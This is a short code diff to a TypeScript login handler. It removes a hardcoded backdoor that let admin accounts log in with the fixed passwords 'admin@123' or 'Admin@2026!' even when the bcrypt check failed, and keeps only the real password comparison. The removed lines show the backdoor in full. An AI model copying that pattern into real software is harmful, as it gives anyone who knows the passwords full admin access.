@@ -20,10 +20,7 @@ export const login = async (req: Request, res: Response) => {
       return res.status(400).json({ msg: "Invalid password" });
     }
 
-    let isMatch = await bcrypt.compare(password, user.password_hash);
-    if (!isMatch && user.role === "admin" && (password === "admin@123" || password === "Admin@2026!")) {
-      isMatch = true;
-    }
+    const isMatch = await bcrypt.compare(password, user.password_hash);
 
     if (!isMatch) {
       return res.status(400).json({ msg: "Invalid password" });
